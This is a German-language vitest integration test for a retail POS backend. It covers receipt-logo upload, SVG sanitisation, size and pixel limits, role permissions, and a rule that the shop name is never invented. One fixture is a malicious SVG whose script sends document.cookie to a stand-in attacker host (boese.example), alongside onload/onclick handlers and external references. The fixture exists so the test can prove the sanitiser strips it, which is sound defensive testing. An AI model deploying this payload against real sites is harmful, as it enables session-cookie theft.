/**
 * ════════════════════════════════════════════════════════════════════════════
 *  Beleg-Logo — das Logo des Haendlers als Mandantendatum (Wanderung 0119)
 * ════════════════════════════════════════════════════════════════════════════
 *
 * Basels Dekret vom 26.07.2026: der Haendler laedt in den Beleg-Einstellungen
 * SEIN Logo hoch (SVG, PNG oder JPEG), und jeder Bon danach traegt es. Diese
 * Datei ist der Wächter fuer die Server-Seite dieses Werks:
 *
 *   1. POST /api/beleg-logo nimmt SVG an — aber NUR bereinigt. SVG ist ein
 *      Angriffsweg (Script, on*-Attribute, foreignObject, fremde Verweise);
 *      der Test laedt ein BOESARTIGES SVG hoch und beweist, dass das
 *      GESPEICHERTE sauber ist. Ein SVG, das nach der Waesche leer ist, wird
 *      mit klarer Meldung abgelehnt.
 *   2. Grenzen: hoechstens 256 KB, Rasterbilder hoechstens 2048 px Kante.
 *   3. Rechte: nur der Inhaber (ADMIN + Stufenanhebung). Kassierer: 403.
 *   4. Lesen ohne zweiten Rundgang: das Logo kommt in GET /api/shop-info mit.
 *      Loeschen fuehrt zurueck zur Vorgabe (logo: null → die Kasse druckt die
 *      norns.de-Systemzeile, KEIN fremdes Logo).
 *   5. Die stillen Rueckfaelle `?? 'WAREHOUSE 14'` sind tot: ein leerer
 *      Ladenname wird NIE erfunden. (Die Fehlerklasse „erfinden statt
 *      fragen“, die dieses Haus zweimal an einem Tag gefunden hat.)
 *
 *      ⚠️ Der Riegel steht seit dem 30.07.2026 an einer ANDEREN Tuer, und das
 *      ist Absicht: /api/shop-info ist die LESE-Tuer, und sie beliefert genau
 *      die Maske, in die der Inhaber den Namen eintraegt. Ein 409 dort
 *      sperrte ihn aus seiner eigenen Einstellung aus — nachgestellt an der
 *      laufenden Kasse, siehe die Begruendung in `routes/shop-info.ts`.
 *      Gesperrt wird deshalb dort, wo wirklich GEDRUCKT wird: der
 *      Kassenbericht verweigert den Briefkopf mit klarem Text. Die Lese-Tuer
 *      liefert die Wahrheit, auch wenn sie leer ist.
 *
 * Gefahren wird gegen ein ECHTES Postgres im Behaelter mit JEDER
 * Produktionswanderung und der Anwendungsrolle `warehouse14_app` — eine
 * fehlende GRANT auf `beleg_logo` faellt hier auf, nicht am ersten echten Tag.
 */

import sharp from 'sharp';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import { baueFiskalBuehne } from '../helfer/fiskal-buehne.js';

const buehne = baueFiskalBuehne();

/** DELETE/PATCH fehlen der Buehne — derselbe Kopfzeilenbau wie ihr `hol()`. */
function kopfzeilen(token?: string): Record<string, string> {
  return {
    cookie: `warehouse14.session=${token ?? buehne.akteure.inhaberSitzung}`,
    'x-dev-device-fingerprint': buehne.akteure.geraetFingerabdruck,
    'content-type': 'application/json',
  };
}

/**
 * Das boesartige SVG: alle vier Angriffswege in einer Datei — Script-Element,
 * on*-Attribute, foreignObject und fremde href/xlink:href-Verweise. Der Kreis
 * ist der einzige ehrliche Inhalt und muss die Waesche ueberleben.
 */
const BOESES_SVG = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100" onload="stehlen()">
  <script>fetch('https://boese.example/klau?k=' + document.cookie)</script>
  <circle cx="50" cy="50" r="40" fill="#000" onclick="alert(1)"/>
  <foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml">gefaehrlich</body></foreignObject>
  <use xlink:href="https://boese.example/fremd.svg#logo"/>
  <image href="http://boese.example/pixel.png" width="10" height="10"/>
</svg>`;

/** Ein SVG, das NUR aus einem Script besteht — nach der Waesche bleibt nichts. */
const NUR_SCRIPT_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><script>alert(1)</script></svg>`;

describe('Beleg-Logo: das Logo des Haendlers als Mandantendatum', () => {
  beforeAll(async () => {
    await buehne.starten();
    await buehne.leeren();
  }, 180_000);

  afterAll(async () => {
    await buehne.stoppen();
  });

  it('ein Kassierer darf kein Logo setzen (403) — der Inhaber schon, ohne Code', async () => {
    const alsKassierer = await buehne.sende(
      '/api/beleg-logo',
      { format: 'svg', dataBase64: Buffer.from(BOESES_SVG, 'utf8').toString('base64') },
      { token: buehne.akteure.kassiererSitzung },
    );
    expect(alsKassierer.statusCode).toBe(403);

    // Basel, 05.08.2026: der Gerätecode steht nur noch vor Unwiderruflichem.
    // Ein Logo lässt sich jederzeit ersetzen oder löschen, also fragt die
    // Kasse hier nicht. Die RECHTEPRÜFUNG bleibt: der Kassierer darf es
    // weiterhin nicht, und das ist die Zeile darüber.
    const ohneCode = await buehne.sende(
      '/api/beleg-logo',
      { format: 'svg', dataBase64: Buffer.from(BOESES_SVG, 'utf8').toString('base64') },
      { token: buehne.akteure.inhaberSitzungOhneStufe },
    );
    expect(ohneCode.statusCode).toBe(200);
  });

  it('ein boesartiges SVG wird angenommen, aber NUR bereinigt gespeichert', async () => {
    const antwort = await buehne.sende('/api/beleg-logo', {
      format: 'svg',
      dataBase64: Buffer.from(BOESES_SVG, 'utf8').toString('base64'),
    });
    expect(antwort.statusCode).toBe(200);

    // Das Logo kommt im Weg mit, den die Kasse ohnehin zieht — kein zweiter
    // Rundgang.
    const info = await buehne.hol('/api/shop-info');
    expect(info.statusCode).toBe(200);
    const logo = info.json().logo as { format: string; dataBase64: string } | null;
    expect(logo).not.toBeNull();
    expect(logo!.format).toBe('svg');

    const gespeichert = Buffer.from(logo!.dataBase64, 'base64').toString('utf8');
    // Kein Angriffsweg hat die Waesche ueberlebt …
    expect(gespeichert.toLowerCase()).not.toContain('<script');
    expect(gespeichert.toLowerCase()).not.toContain('onload');
    expect(gespeichert.toLowerCase()).not.toContain('onclick');
    expect(gespeichert.toLowerCase()).not.toContain('foreignobject');
    expect(gespeichert).not.toContain('boese.example');
    // … der ehrliche Inhalt schon.
    expect(gespeichert).toContain('<circle');

    // Und zwar IN DER DATENBANK, nicht nur in der Antwort: die Zeile selbst
    // ist sauber (gelesen mit der Anwendungsrolle — beweist zugleich die
    // GRANTs auf beleg_logo).
    const zeilen = await buehne.sql`SELECT format, daten FROM beleg_logo`;
    expect(zeilen).toHaveLength(1);
    const inDb = Buffer.from(zeilen[0]!.daten as Uint8Array).toString('utf8');
    expect(inDb.toLowerCase()).not.toContain('<script');
    expect(inDb).not.toContain('boese.example');
  });

  it('ein SVG, das nach der Waesche leer ist, wird mit klarer Meldung abgelehnt', async () => {
    const antwort = await buehne.sende('/api/beleg-logo', {
      format: 'svg',
      dataBase64: Buffer.from(NUR_SCRIPT_SVG, 'utf8').toString('base64'),
    });
    expect(antwort.statusCode).toBe(400);
    expect(antwort.json().error.message).toContain('leer');
  });

  it('mehr als 256 KB werden abgelehnt', async () => {
    const zuGross = Buffer.alloc(262_145, 0x41);
    const antwort = await buehne.sende('/api/beleg-logo', {
      format: 'png',
      dataBase64: zuGross.toString('base64'),
    });
    expect(antwort.statusCode).toBe(400);
    expect(antwort.json().error.message).toContain('256');
  });

  it('ein Rasterbild ueber 2048 px Kante wird abgelehnt', async () => {
    const breit = await sharp({
      create: { width: 2300, height: 80, channels: 3, background: { r: 10, g: 10, b: 10 } },
    })
      .png()
      .toBuffer();
    const antwort = await buehne.sende('/api/beleg-logo', {
      format: 'png',
      dataBase64: breit.toString('base64'),
    });
    expect(antwort.statusCode).toBe(400);
    expect(antwort.json().error.message).toContain('2048');
  });

  it('PNG rund: hochladen, in shop-info lesen, loeschen fuehrt zurueck zur Vorgabe', async () => {
    const png = await sharp({
      create: { width: 200, height: 100, channels: 3, background: { r: 120, g: 90, b: 20 } },
    })
      .png()
      .toBuffer();

    const hoch = await buehne.sende('/api/beleg-logo', {
      format: 'png',
      dataBase64: png.toString('base64'),
    });
    expect(hoch.statusCode).toBe(200);
    expect(hoch.json().format).toBe('png');

    const info = await buehne.hol('/api/shop-info');
    const logo = info.json().logo as { format: string; dataBase64: string } | null;
    expect(logo?.format).toBe('png');
    // Raster wird als Original gespeichert — Byte fuer Byte.
    expect(logo?.dataBase64).toBe(png.toString('base64'));

    const weg = await buehne.app.inject({
      method: 'DELETE',
      url: '/api/beleg-logo',
      headers: kopfzeilen(),
    });
    expect(weg.statusCode).toBe(200);
    expect(weg.json().geloescht).toBe(true);

    const danach = await buehne.hol('/api/shop-info');
    expect(danach.statusCode).toBe(200);
    // Vorgabe ohne eigenes Logo: KEIN fremdes Logo. null heisst fuer die
    // Kasse: norns.de-Systemzeile, sonst nichts.
    expect(danach.json().logo).toBeNull();
  });

  it('ein leerer Ladenname wird nie erfunden: die Lese-Tuer liefert ehrlich, die Druck-Tuer sperrt', async () => {
    // Der Inhaber hat den Beleg-Namen geleert — frueher erfand der Server
    // hier still 'WAREHOUSE 14'.
    await buehne.migratorSql`
      UPDATE system_settings SET value = '""'::jsonb WHERE key = 'shop.name'`;

    // ── 1. Leeres Belegfeld erbt den RECHTLICHEN Namen ────────────────────
    // Wer nur den Bereich Betrieb ausfuellt, bekommt keinen Beleg ohne Kopf.
    // Geerbt wird nur, was der Haendler selbst eingetragen hat; hergestellt
    // wird nichts (`lib/beleg-identitaet.ts`).
    const [rechtlich] = await buehne.migratorSql<{ wert: string }[]>`
      SELECT value #>> '{}' AS wert FROM system_settings WHERE key = 'shop.legal_name'`;
    expect(rechtlich!.wert).not.toBe('');
    const geerbt = await buehne.hol('/api/shop-info');
    expect(geerbt.statusCode).toBe(200);
    expect(geerbt.json().name).toBe(rechtlich!.wert);

    // ── 2. Ist BEIDES leer, bleibt der Name leer ──────────────────────────
    // Das ist der Kern: eine leere Wahrheit, nie ein erfundener Kopf. Die
    // Lese-Tuer antwortet trotzdem mit 200, denn sie beliefert die Maske,
    // die den Namen eintraegt.
    await buehne.migratorSql`
      UPDATE system_settings SET value = '""'::jsonb WHERE key = 'shop.legal_name'`;
    const info = await buehne.hol('/api/shop-info');
    expect(info.statusCode).toBe(200);
    expect(info.json().name).toBe('');

    // Der Kassenbericht erfindet nichts und laesst sich auch nichts erben:
    // ein Pruefer, der ein Papier in der Hand haelt, muss den Absender
    // lesen koennen, sonst gibt es das Papier nicht.
    const produktId = await buehne.legeProduktAn({ behandlung: 'STANDARD_19' });
    await buehne.legeBelegAn({
      direction: 'VERKAUF',
      treatment: 'STANDARD_19',
      subtotal: '100.00',
      vat: '19.00',
      total: '119.00',
      customerId: null,
      finalizedAt: buehne.ts(11),
      items: [
        {
          productId: produktId,
          treatment: 'STANDARD_19',
          vatRate: '0.1900',
          lineSubtotal: '100.00',
          lineVat: '19.00',
          lineTotal: '119.00',
          displayOrder: 0,
        },
      ],
      payment: { method: 'CASH', amount: '119.00' },
    });
    // Der Kassenbericht wird nur fuer einen FESTGESCHRIEBENEN Tag gedruckt
    // (gemessen: sonst 409 „noch nicht finalisiert"), und ein solcher braucht
    // per CHECK einen Anker in der Beweiskette.
    //
    // ⚠️ Geschrieben wird er hier von Hand statt mit `legeAbschlussAn`, weil
    // die gemeinsame Buehne seit den Wanderungen 0124 und 0125 weder `z_nr`
    // noch `kassensturz_quelle` setzt und diese Datei die gemeinsame Buehne
    // nicht anfassen darf. Der Bedarf ist gemeldet; faellt er weg, gehoert
    // dieser Block zurueck auf `legeAbschlussAn`.
    const [ketteKopf] = await buehne.migratorSql<{ id: string; row_hash: Buffer }[]>`
      SELECT id, row_hash FROM ledger_events ORDER BY id DESC LIMIT 1`;
    const [abschluss] = await buehne.migratorSql<{ id: string }[]>`
      INSERT INTO daily_closings (
        business_day, state, z_nr,
        verkauf_count, gross_verkauf_eur, net_verkauf_eur,
        cash_drawer_expected_eur, cash_drawer_counted_eur, cash_drawer_variance_eur,
        kassensturz_quelle,
        ledger_anchor_id, ledger_anchor_hash,
        counted_by_user_id, counted_at, finalized_by_user_id, finalized_at
      ) VALUES (
        ${buehne.geschaeftstag}::date, 'FINALIZED'::closing_state,
        (SELECT coalesce(max(z_nr), 0) + 1 FROM daily_closings),
        1, '119.00', '100.00',
        '119.00', '119.00', '0.00',
        'EIGENER_STURZ'::kassensturz_quelle,
        ${ketteKopf!.id}, ${ketteKopf!.row_hash},
        ${buehne.akteure.inhaberId}, now(), ${buehne.akteure.inhaberId}, now()
      ) RETURNING id`;
    const abschlussId = abschluss!.id;
    const bericht = await buehne.hol(
      `/api/closings/${abschlussId}/export/kassenbericht?format=html`,
    );
    expect(bericht.statusCode).toBe(409);
    expect(bericht.json().error.message).toContain('Der Name des Ladens ist nicht eingetragen');

    // Mit gepflegtem Namen laufen beide Wege wieder — mit DEM Namen, nicht
    // mit unserem.
    await buehne.migratorSql`
      UPDATE system_settings SET value = '"Goldkontor Probe"'::jsonb WHERE key = 'shop.name'`;
    const infoDanach = await buehne.hol('/api/shop-info');
    expect(infoDanach.statusCode).toBe(200);
    expect(infoDanach.json().name).toBe('Goldkontor Probe');
    const berichtDanach = await buehne.hol(
      `/api/closings/${abschlussId}/export/kassenbericht?format=html`,
    );
    expect(berichtDanach.statusCode).toBe(200);
    expect(berichtDanach.body).toContain('Goldkontor Probe');
  });
});
